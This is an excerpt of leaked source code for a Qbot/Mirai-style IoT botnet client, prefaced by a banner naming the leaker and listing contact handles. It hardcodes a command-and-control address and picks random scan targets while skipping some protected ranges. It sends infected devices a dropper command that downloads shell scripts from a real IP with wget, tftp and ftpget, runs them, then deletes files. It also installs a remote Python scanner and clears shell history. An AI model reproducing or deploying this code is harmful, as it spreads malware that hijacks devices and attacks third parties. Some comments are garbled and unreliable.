/*
QBOT LEAK BY FREAK/SYNTHMESC (same person)
       (\_          _/)
       )  (        )  (
      (    (      )    )
       )_(\ \.--./ /)_(
...
Xmpp: B1NARY~
Instragram: @arman.emoji
Skype: b1narythag0d

*/
/*
Things Coming to Build 6.
...
unsigned char *commServer[] = { "162.250.127.133":23" };
char *Busybox_Payload = "";
char *Payload = "";
...
in_addr_t MiraiIPRanges()
{
        ...
        while(
                ...
                (ipState[0] == 0) || 									   	   // 50.115.166.103/8        - Invalid address space
				...
				(ipState[0] == 10) ||										   // 150.115.166.103/8       - Internal network
				...
				(ipState[0] == 6 || ipState[0] == 7 || ipState[0] == 11 || ipState[0] == 21 || ipState[0] == 22 || ipState[0] == 26 || ipState[0] == 28 || ipState[0] == 29 || ipState[0] == 30 || ipState[0] == 33 || ipState[0] == 55 || ipState[0] == 214 || ipState[0] == 215) // Department of Defense
        )
        {
                ipState[0] = rand() % 223;
                ipState[1] = rand() % 255;
			...
			case 7:
				{
                        ...
                        if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.103/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 50.115.166.103 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 50.115.166.103; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 50.115.166.103 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 407, MSG_NOSIGNAL) < 0)
						{
        ...
        while(1) {
			...
			case 7:
				{		fds[i].tTimeout = time(NULL);
                        ...
                        if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.103/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 50.115.166.103 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 50.115.166.103; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 50.115.166.103 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *", 407, MSG_NOSIGNAL) < 0)
						{
...
void processCmd(int argc, unsigned char *argv[]) {
		...
		if(!strcmp(argv[0], "PYTHON")) //Infect a Scanner server to the net, before executing this.
		{
			...
			{
				system("sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 50.115.166.103/scan.py");
				ClearHistory();
				sockprintf(mainCommSock, "Installing Python Scanner");
			}
			if(!strcmp(argv[1], "UPDATE"))
			{
				system("cd /.tmp;rm -rf *py;wget 50.115.166.103/scan.py");
				ClearHistory();
